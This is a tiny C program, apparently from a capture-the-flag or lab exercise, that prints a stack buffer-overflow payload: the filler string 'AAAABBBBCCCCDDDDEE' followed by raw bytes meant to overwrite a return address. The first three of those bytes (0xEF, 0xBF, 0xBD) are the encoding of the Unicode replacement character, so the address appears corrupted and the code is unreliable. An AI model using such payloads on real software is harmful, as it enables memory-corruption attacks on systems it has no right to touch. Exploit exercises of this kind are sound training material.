#include <stdio.h>

int main(){
    printf("AAAABBBBCCCCDDDDEE%c%c%c%c%c", 0xEF, 0xBF, 0xBD, 0x11, 0x40);
}